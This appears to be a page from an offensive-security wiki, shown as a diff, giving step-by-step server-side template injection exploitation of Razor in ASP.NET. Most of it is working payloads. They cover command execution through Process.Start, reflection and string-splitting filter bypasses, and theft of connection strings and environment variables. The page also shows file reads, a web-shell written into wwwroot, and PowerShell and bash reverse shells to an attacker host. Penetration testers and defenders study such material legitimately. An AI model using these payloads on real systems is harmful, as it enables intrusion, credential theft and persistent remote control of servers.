@@ -1,0 +1,244 @@
+---
+title: Razor (.NET - ASP.NET, ASP.NET Core)
+description: SSTI exploitation in Razor - System.Diagnostics.Process abuse, full .NET BCL access, payloads for ASP.NET Core admin sinks.
+mitre: [T1190, T1059.001]
+d3fend: [D3-EAL]
+impact: [ServerSideEval, RCE, FileRead]
+sidebar:
+  order: 9
+  label: Razor
+---
+import { Aside } from '@astrojs/starlight/components';
+
+## TL;DR
+
+Razor evaluates C#. If you reach Razor compilation with user input, you have full .NET BCL access - `System.Diagnostics.Process.Start`, `System.IO.File`, anything in the application's referenced assemblies.
+
+```
+# Confirm Razor
+@(7*7)                                       # → 49
+@System.Environment.MachineName              # returns server hostname
+
+# RCE - direct
+@System.Diagnostics.Process.Start("cmd", "/c whoami").StandardOutput.ReadToEnd()
+@{ var p = new System.Diagnostics.Process(); p.StartInfo.FileName = "cmd"; p.StartInfo.Arguments = "/c whoami"; p.StartInfo.UseShellExecute = false; p.StartInfo.RedirectStandardOutput = true; p.Start(); p.WaitForExit(); @p.StandardOutput.ReadToEnd() }
+
+# File read
+@System.IO.File.ReadAllText(@"C:\Windows\System32\drivers\etc\hosts")
+@System.IO.File.ReadAllText("/etc/passwd")   # Linux .NET Core
+```
+
+Success indicator: command output (username, hostname, file contents) in response.
+
+## Where this engine lives
+
+- **ASP.NET (Web Forms with Razor)** - `.cshtml` files. SSTI sinks are rare on classic Web Forms but appear in custom CMSes.
+- **ASP.NET Core MVC** - Razor is the default view engine. Sinks are in admin "template editor" features or anywhere `RazorEngine` / `RazorLight` is invoked with user input.
+- **Umbraco CMS** - `.cshtml` templates editable by admins. Common target.
+- **Orchard Core** - Razor templates in widget definitions.
+- **DotNetNuke / DNN** - module Razor templates.
+- **Custom .NET apps** - anything embedding `RazorEngine.Engine.Razor.RunCompile()` with externally-influenced input.
+
+## Step 1 - Confirm and orient
+
+```
+@(7*7)                           # → 49        confirms Razor template eval
+@System.Environment.MachineName  # returns hostname - confirms .NET BCL access
+@DateTime.Now                    # returns current server time
+```
+
+If `@(7*7)` returns `49`, Razor is evaluating. Move directly to step 2 - there's no sandbox layer in Razor by default.
+
+## Step 2 - RCE paths
+
+C# has multiple process-launch APIs. Pick based on what the application reflects.
+
+### Path A - `Process.Start` with output capture
+
+```
+@{
+  var psi = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c whoami") {
+    UseShellExecute = false,
+    RedirectStandardOutput = true
+  };
+  var p = System.Diagnostics.Process.Start(psi);
+  p.WaitForExit();
+  @p.StandardOutput.ReadToEnd()
+}
+```
+
+The verbose form. Captures stdout and reflects it. Use when you control a full code block.
+
+### Path B - `Process.Start` one-liner
+
+```
+@System.Diagnostics.Process.Start("cmd.exe", "/c whoami").StandardOutput.ReadToEnd()
+```
+
+Won't capture output without `RedirectStandardOutput` - usually returns empty or null reference. Use when you only need the command to run, not the output.
+
+### Path C - Linux .NET Core
+
+On .NET Core / .NET 5+ running on Linux:
+
+```
+@{
+  var psi = new System.Diagnostics.ProcessStartInfo("/bin/sh", "-c \"id\"") {
+    UseShellExecute = false,
+    RedirectStandardOutput = true
+  };
+  var p = System.Diagnostics.Process.Start(psi);
+  p.WaitForExit();
+  @p.StandardOutput.ReadToEnd()
+}
+```
+
+Same shape, different executable.
+
+### Path D - `System.Reflection` for blocked-namespace bypass
+
+If `System.Diagnostics` is filtered, reach `Process` via reflection:
+
+```
+@{
+  var t = System.Type.GetType("System.Diagnostics.Process");
+  var startMethod = t.GetMethod("Start", new System.Type[] { typeof(string), typeof(string) });
+  startMethod.Invoke(null, new object[] { "cmd.exe", "/c whoami" });
+}
+```
+
+Cleaner via `Assembly.Load`:
+
+```
+@{
+  var asm = System.Reflection.Assembly.Load("System.Diagnostics.Process");
+  var t = asm.GetType("System.Diagnostics.Process");
+  // ... invoke as above
+}
+```
+
+## Step 3 - Loot before escalating
+
+```
+# Application config / connection strings
+@System.Configuration.ConfigurationManager.ConnectionStrings["default"].ConnectionString
+@System.Configuration.ConfigurationManager.AppSettings.AllKeys
+
+# ASP.NET Core configuration (when IConfiguration is reachable through @inject)
+@inject Microsoft.Extensions.Configuration.IConfiguration Config
+@Config["ConnectionStrings:DefaultConnection"]
+
+# Environment variables
+@System.Environment.GetEnvironmentVariables()
+@System.Environment.GetEnvironmentVariable("ASPNETCORE_ENVIRONMENT")
+
+# Server info
+@System.Environment.MachineName
+@System.Environment.UserName                 # account the app runs as
+@System.Environment.OSVersion
+@System.Environment.CurrentDirectory         # application root
+@System.Environment.SystemDirectory
+
+# Loaded assemblies (reveals frameworks/libraries in use)
+@string.Join(",", System.AppDomain.CurrentDomain.GetAssemblies().Select(a => a.FullName))
+```
+
+Connection strings frequently contain DB credentials in plaintext - often sufficient on its own.
+
+## Step 4 - File operations
+
+```
+# Read
+@System.IO.File.ReadAllText(@"C:\Windows\win.ini")
+@System.IO.File.ReadAllText("/etc/passwd")
+@System.IO.File.ReadAllLines(@"C:\path\to\config.json")
+
+# Directory listing
+@string.Join(",", System.IO.Directory.GetFiles(@"C:\"))
+@string.Join(",", System.IO.Directory.GetFiles("/etc"))
+
+# Write
+@{ System.IO.File.WriteAllText(@"C:\inetpub\wwwroot\x.aspx", "<%@ Page Language=\"C#\" %><% Response.Write(System.Diagnostics.Process.Start(\"cmd\",\"/c \"+Request[\"c\"]).StandardOutput.ReadToEnd()); %>"); }
+```
+
+The web-shell write creates an `.aspx` file accessible at `/x.aspx?c=whoami` for follow-up commands without re-triggering the SSTI.
+
+## Step 5 - Reverse shell
+
+PowerShell encoded payload via `Process.Start`:
+
+```
+@System.Diagnostics.Process.Start("powershell.exe", "-NoP -NonI -W Hidden -Enc BASE64_PAYLOAD")
+```
+
+Replace `BASE64_PAYLOAD` with the UTF-16LE base64 of:
+
+```powershell
+$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close()
+```
+
+For .NET Core on Linux:
+
+```
+@System.Diagnostics.Process.Start("/bin/sh", "-c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"")
+```
+
+## Razor-engine-specific notes
+
+Two distinct libraries handle Razor outside the ASP.NET runtime:
+
+- **RazorEngine** - older package, NuGet `RazorEngine`. Trivially exploitable when called with user input.
+- **RazorLight** - newer, NuGet `RazorLight`. Same exploitability profile.
+
+Sinks look like:
+
+```csharp
+// RazorEngine
+var result = RazorEngine.Engine.Razor.RunCompile(userInput, "templateKey", null, model);
+
+// RazorLight
+var result = await engine.CompileRenderStringAsync("templateKey", userInput, model);
+```
+
+These libraries are how Razor SSTI shows up outside MVC views - for example, in headless services that template email or report content.
+
+## Filter-aware variants
+
+```
+# Namespace fragments concatenated
+@{ var ns = "System.Diagn" + "ostics.Process"; }
+@{ var t = System.Type.GetType(ns); /* ... */ }
+
+# Unicode escapes in C# string literals (Razor compiles to C#)
+@System.Diagnostics.\u0050rocess.Start("cmd", "/c id")
+
+# Through @using
+@using SDP = System.Diagnostics.Process
+@SDP.Start("cmd", "/c id")
+```
+
+Razor's filter surface is narrow because the compiler accepts so many equivalent forms. Filtering by string match almost always misses an alternative path.
+
+## Detection-only payloads
+
+```
+@(7*7)                                       # eval probe (returns 49)
+@System.Environment.MachineName              # returns hostname (clear ID of Razor)
+@DateTime.Now                                # returns server time
+@System.IO.Path.DirectorySeparatorChar       # returns "\" on Windows, "/" on Linux - OS fingerprint
+@System.Environment.OSVersion.Platform       # returns Win32NT or Unix
+```
+
+`@System.IO.Path.DirectorySeparatorChar` is a useful early probe - it returns a single character that's hard to confuse with anything else and tells you the OS in one go.
+
+## Notes
+
+- **`@{ }` code blocks** allow multi-statement C#. Useful for capturing process output cleanly.
+- **`@:` inline output** lets you reflect the result of an expression as text instead of an HTML node - useful in cases where the output is being structured as JSON or YAML.
+- **MVC view compilation** - ASP.NET Core compiles views ahead of time by default (Razor compilation in build pipeline). User-input templates require explicit runtime compilation via `RazorViewEngine` or one of the standalone libraries above.
+- **`ConfigurationManager` is .NET Framework only** - on .NET Core / .NET 5+, configuration access is through `IConfiguration` via dependency injection. Use the `@inject` directive in a Razor view (if you can include it) or reach configuration through the static `ConfigurationBuilder` path.
+- **Output suppression** - Razor errors during compilation throw `RazorEngineCompilationException` (or similar). Production apps usually swallow these to a generic error page. If a probe produces no output but the page still renders normally, the compilation likely failed - try simpler probes to confirm presence first.
+
+<Aside type="caution">
+Razor SSTI typically lives in admin-only template editors. By the time you're authenticated as an admin in an ASP.NET app, you already have substantial access - the SSTI is mostly useful for code execution at the OS level rather than further privilege escalation within the app. Confirm scope before going past `@System.Environment.MachineName`.
+</Aside>
